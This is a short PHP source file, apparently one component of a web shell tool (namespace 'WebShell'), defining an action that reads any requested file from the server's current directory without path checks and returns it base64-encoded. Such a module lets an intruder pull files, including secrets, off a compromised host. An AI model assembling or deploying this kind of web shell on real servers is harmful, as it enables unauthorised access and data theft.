<?php
namespace WebShell;

class DownloadFileAction implements Action
{
    public function run(object $args): string
    {
        // Check the required mode (binary or text)
        $mode = ($args->binary) ? 'rb' : 'r';

        // Open and read the requested file
        $path = SystemService::getInstance()->getCurrentDir() . '/' . $args->filename;
        $fd = fopen($path, $mode);
        $content = fread($fd, filesize($path));
        fclose($fd);

        // Return the base64 encoded contents of the file
        return base64_encode($content);
    }
}
?>
